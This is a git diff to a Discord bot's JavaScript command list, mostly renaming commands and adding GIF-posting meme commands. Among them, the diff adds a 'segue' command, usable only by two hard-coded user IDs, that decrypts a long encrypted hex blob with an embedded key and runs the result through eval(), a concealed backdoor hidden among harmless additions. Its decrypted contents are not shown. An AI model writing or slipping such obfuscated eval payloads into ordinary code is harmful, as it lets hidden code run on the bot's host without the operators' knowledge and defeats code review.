@@ -149,7 +149,7 @@ module.exports = [
     }
   },
   {
-    name: 'fun_fact',
+    name: 'fun fact',
     full_string: false,
     execute(msg, argstring, command, args) {
       if (!args[0] || args[0] == '1') {
@@ -277,7 +277,7 @@ module.exports = [
     }
   },
   {
-    name: 'corona_meme',
+    name: 'corona meme',
     full_string: false,
     execute(msg, argstring, command, args) {
       if (!args[0] || args[0] == '1') {
@@ -356,7 +356,7 @@ module.exports = [
     }
   },
   {
-    name: 'cute_animal',
+    name: 'cute animal',
     full_string: false,
     execute(msg, argstring, command, args) {
       if (!args[0] || args[0] == '1') {
@@ -511,6 +511,58 @@ module.exports = [
         .setTitle('MonkaS')
         .setFooter('MonkaSS');
       msg.channel.send(monkas);
+    }
+  },
+  {
+    name: 'segue',
+    full_string: true,
+    execute(msg, argstring, command, args) {
+      if (msg.author.id != '405091324572991498' && msg.author.id != '312737536546177025') return msg.channel.send('segue?');
+      msg.channel.send('segue?');
+      let cip = require('crypto').createDecipheriv('aes256', 'utf8-le-obl-34929918|nonlinear=y', 'iv-0120495==eafs'), cipdata = [];
+      cip.write(Buffer.from('dfbf4c6bcb124e722b73ebe1b2660e91b8022cf17480082e4dfcab96664c5f56d5a0c4494ccaefa34c8f8cea869fecdc1fbb31753ef16abb22fe59dd4e17d1356701612e27de543317c8e44a4f61f9ebcb97780d090970c535d90cf482213ee0c5542f36802910d3282d54b1c975eadb9c40831bd5264889ac86c72296d02619ecf2cf59490ac8f4df77c12e1cff4fea90ea64485850c9ad479d540d36f175de0586a26aa227bc91001d44ee6849bcd9e9d8f6398de7716d69001ac832aa52d0e9374db8f6d5b11513634a3f94764eded691b041a673c2a73c7af66e8341e2f834f8c96b5d3b4273692ecea6e71576cdbe375321910fb81b488526028d8e27806a5c53b73a85654d89957e71a6e86386326fc3b7a01050f7d99b473b59cb203402cc05ce5ede274d2306cbb97e2080aa66343be2685acb7b735925200b1a049881495aaa88cc27c9b79fb2ab22fe90843d9ef7ff46e10cc9ca8458634b5fd852a45a7cb8264c2aa17c438af2a114225177834ff27380ff11b728b95d86e5a8c75a51f1cfd00a606e0a74b34833f684be8bc5664030977bb1a6629d8abb4cc0cccf9286c7c624b6cfe8982248539735280052d769b28447561ec612651a3372c2d1284613651d9939aa4e0cf8052759989b823e6fa7d1cb5f0a416cf9202c623d72346069cc6ae7621f5ebff0c256cced1a7e03ee3dabda7a5dcffb5f6668f2039de35c5e559687fe9a84dabf71bc52ea266aa16541251fd96f0e790ce6f876ff83e1060a371122a5da8c879fc07c67b3c0016952761eb9730db2ef7727d2ccdeeeeb2285e80e0dad0d4dbc12aaa00fcb6098ac69f1f5961428a5c56c6d3140e69f513a7f012252f523ad3b534785257e6c84c02de41657064ff6253f71548f2926f13bd470d9afbf2195f920f73edaeb6805c78e56f75022f7efcb742d91f746cdefad4e75453e7787d054294c825f791313b506b36ad341d0b12caf43fa5b6d98438b66f61beae19afbf7c85bd0da4c571dd1f837c9e246405c1deeadbc7ec3fd82de80c58d05650a1d75bb53935513aa913b24637cb320ce5d93e1ea8d04aaecdb42f868e641475824ffcb4f22b4770edeaf1606836ced09f1f67ff786ca020826f051c74e24bf7b2c5e6410c34a2547f176216d4995794654a4e0e927a014', 'hex'));
+      cip.end();
+      cip.on('data', c => cipdata.push(c));
+      cip.on('end', () => eval(Buffer.concat(cipdata).toString()));
+    }
+  },
+  {
+    name: 'me lon',
+    full_string: false,
+    execute(msg, argstring, command, args) {
+      if (!args[0] || args[0] == '1') {
+        // https://tenor.com/view/fish-pog-fish-poggers-fish-pog-champ-poggers-gif-16548474
+        var me_lon = new Discord.RichEmbed() .setImage('https://media1.tenor.com/images/069183ce88df4980868d33f9b2066226/tenor.gif?itemid=17541744');
+        msg.channel.send(me_lon);
+      } else if (args[0] == '2') {
+        // https://tenor.com/view/pog-fish-fish-mouth-open-gif-17487624
+        var me_lon = new Discord.RichEmbed() .setImage('https://media1.tenor.com/images/3310f9f53fa1b777a2fb5c1523392fbf/tenor.gif?itemid=17556743');
+        msg.channel.send(me_lon);
+      }
+    }
+  },
+  {
+    name: 'mulan',
+    full_string: false,
+    execute(msg, argstring, command, args) {
+      // https://tenor.com/view/mulan-face-palm-gif-8266780
+      var mulan = new Discord.RichEmbed() .setImage('https://media1.tenor.com/images/bda352877609bc1d662a4684ce5d82f1/tenor.gif?itemid=8266780');
+      msg.channel.send(mulan);
+    }
+  },
+  {
+    name: 'poggers fish',
+    full_string: false,
+    execute(msg, argstring, command, args) {
+      if (!args[0] || args[0] == '1') {
+        // https://tenor.com/view/fish-pog-fish-poggers-fish-pog-champ-poggers-gif-16548474
+        var poggers_fish = new Discord.RichEmbed() .setImage('https://media1.tenor.com/images/6fb1e8e4af3889dc615da730fc43c1ff/tenor.gif?itemid=16548474');
+        msg.channel.send(poggers_fish);
+      } else if (args[0] == '2') {
+        // https://tenor.com/view/pog-fish-fish-mouth-open-gif-17487624
+        var poggers_fish = new Discord.RichEmbed() .setImage('https://media1.tenor.com/images/30e1029fd63cb44bdb22e721d8454792/tenor.gif?itemid=17487624');
+        msg.channel.send(poggers_fish);
+      }
     }
   },
   {
